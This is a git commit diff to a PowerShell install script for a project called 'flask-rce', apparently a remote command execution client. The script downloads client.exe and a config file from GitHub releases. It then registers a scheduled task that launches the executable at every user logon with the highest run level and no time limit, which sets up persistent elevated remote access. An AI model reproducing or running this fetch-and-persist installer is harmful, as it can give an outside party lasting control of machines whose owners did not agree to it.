fd657c66b7f2b40cc106c8385d31d917b7dcaef3
DapperPixelguy <32307494+DapperPixelguy@users.noreply.github.com>
2026-06-08 17:25:16 +0100

    Update install.ps1

--- client/install.ps1
+++ client/install.ps1
@@ -3,8 +3,8 @@ $taskName = "flask-rce"
 Write-Host "Installing flask-rce..."
 New-Item -ItemType Directory -Force -Path $installDir | Out-Null
 Invoke-WebRequest -Uri "https://github.com/DapperPixelguy/flask-rce/releases/download/alpha/client.exe" -OutFile "$installDir\client.exe" -UseBasicParsing
-Invoke-WebRequest -Uri "https://github.com/DapperPixelguy/flask-rce/releases/download/alpha/config.yaml" -OutFile "$installDir\config.yaml"
-$action = New-ScheduledTaskAction -Execute "$installDir\client.exe"
+Invoke-WebRequest -Uri "https://github.com/DapperPixelguy/flask-rce/releases/download/alpha/config.yaml" -OutFile "$installDir\config.yaml" -UseBasicParsing
+$action = New-ScheduledTaskAction -Execute "$installDir\client.exe" -WorkingDirectory $installDir
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
